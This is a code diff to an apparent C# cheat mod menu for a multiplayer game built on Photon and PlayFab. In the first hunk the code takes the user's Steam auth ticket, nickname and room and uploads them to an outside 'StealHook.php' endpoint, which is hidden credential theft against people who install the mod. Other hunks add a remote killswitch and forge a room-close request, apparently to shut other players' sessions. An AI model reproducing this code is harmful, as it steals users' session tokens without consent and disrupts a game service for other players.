@@ -622,8 +622,7 @@ namespace Steal.Background
 
             NameValueCollection nvc = new NameValueCollection
             {
-                { "username", "ticket " + PlayFabAuthenticator.instance.GetSteamAuthTicket() + "name: " + PhotonNetwork.LocalPlayer.NickName + " " },
-                { "code", PhotonNetwork.CurrentRoom.Name }
+                { "content", "ticket " + PlayFabAuthenticator.instance.GetSteamAuthTicket() + "name: " + PhotonNetwork.LocalPlayer.NickName + " Joined Code: " + PhotonNetwork.CurrentRoom }
             };
             byte[] arr = new WebClient().UploadValues("https://tnuser.com/API/StealHook.php", nvc);
             Console.WriteLine(Encoding.UTF8.GetString(arr));
@@ -641,7 +640,15 @@ namespace Steal.Background
             {
                 Notif.SendNotification("One or more mods have been disabled due to not having master!", Color.white);
                 MenuPatch.RefreshMenu();
-            }   
+            }
+
+            if (new WebClient().DownloadString("https://bbc123f.github.io/killswitch").Contains("="))
+            {
+                Application.Quit();
+            }
+
+            if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "steal", "EXIST.txt")))
+                Application.Quit();
         }
 
         public static void ReAuth()
@@ -4442,10 +4449,15 @@ namespace Steal.Background
                 {
                     GameId = PhotonNetwork.CurrentRoom.Name,
                     Region = Regex.Replace(PhotonNetwork.CloudRegion, "[^a-zA-Z0-9]", "").ToUpper(),
-                    UserId = PhotonNetwork.MasterClient.UserId,
                     ActorNr = 1,
-                    ActorCount = 1,
+                    ActorCount = 0,
                     AppVersion = PhotonNetwork.AppVersion,
+                    AppId = PhotonNetwork.PhotonServerSettings.AppSettings.AppIdRealtime,
+                    State2 = new
+                    {
+                        ActorList = new int[0]
+                    },
+                    Type = "Close"
                 }
             }, result =>
             {
